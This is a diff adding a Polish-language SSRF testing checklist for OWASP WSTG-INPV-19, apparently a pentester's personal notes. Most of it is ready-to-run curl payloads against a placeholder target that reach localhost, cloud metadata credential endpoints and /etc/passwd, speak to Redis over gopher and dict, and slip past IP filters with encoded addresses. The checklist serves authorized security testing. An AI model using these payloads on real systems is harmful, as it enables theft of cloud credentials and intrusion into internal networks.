@@ -1,0 +1,62 @@
+================================================================================
+WSTG-INPV-19 — Testing for Server-Side Request Forgery (SSRF)
+================================================================================
+CELE:
+- Identify SSRF injection points
+- Test if the injection points are exploitable
+- Assess the severity of the vulnerability
+
+================================================================================
+KOMENDY
+================================================================================
+
+# --- Podstawowe SSRF ---
+curl -s "https://TARGET/fetch?url=http://127.0.0.1"
+curl -s "https://TARGET/fetch?url=http://localhost"
+curl -s "https://TARGET/fetch?url=http://[::1]"
+curl -s "https://TARGET/fetch?url=http://0.0.0.0"
+
+# --- SSRF do metadanych chmury ---
+curl -s "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
+curl -s "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+curl -s "https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
+
+# --- SSRF z roznymi schematami ---
+curl -s "https://TARGET/fetch?url=file:///etc/passwd"
+curl -s "https://TARGET/fetch?url=dict://127.0.0.1:6379/info"
+curl -s "https://TARGET/fetch?url=gopher://127.0.0.1:6379/_INFO"
+
+# --- SSRF bypass filtrow ---
+curl -s "https://TARGET/fetch?url=http://2130706433" # decimal IP
+curl -s "https://TARGET/fetch?url=http://0x7f000001" # hex IP
+curl -s "https://TARGET/fetch?url=http://017700000001" # octal IP
+curl -s "https://TARGET/fetch?url=http://127.1"
+curl -s "https://TARGET/fetch?url=http://127.0.0.1.nip.io"
+
+# --- Blind SSRF z Burp Collaborator ---
+curl -s "https://TARGET/fetch?url=http://COLLABORATOR_URL"
+
+================================================================================
+KOMENDY Z WORDLISTAMI
+================================================================================
+
+# --- PayloadsAllTheThings SSRF ---
+# Referencja: /home/parallels/Desktop/WSTG/PayloadsAllTheThings-master/Server Side Request Forgery/README.md
+# Referencja: /home/parallels/Desktop/WSTG/PayloadsAllTheThings-master/Server Side Request Forgery/SSRF-Cloud-Instances.md
+
+# --- SecLists SSRF ---
+# Sprawdz: /home/parallels/Desktop/WSTG/SecLists-master/Fuzzing/ pod katem SSRF
+
+# --- Bug-Bounty-Wordlists ---
+# Referencja: /home/parallels/Desktop/WSTG/Bug-Bounty-Wordlists-main/ (sprawdz ssrf-related files)
+
+================================================================================
+WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
+================================================================================
+1. Zidentyfikuj parametry akceptujace URL/URI (url=, path=, src=, redirect=, uri=)
+2. Testuj dostep do wewnetrznych serwisow (127.0.0.1, 10.x.x.x, 172.16.x.x)
+3. Testuj dostep do metadanych chmury (AWS, GCP, Azure)
+4. Sprawdz rozne schematy protokolow (file://, dict://, gopher://)
+5. Testuj bypass filtrow (decimal IP, hex IP, DNS rebinding)
+6. Uzyj Burp Collaborator do detekcji blind SSRF
+7. Sprawdz czy SSRF pozwala na skanowanie portow wewnetrznych
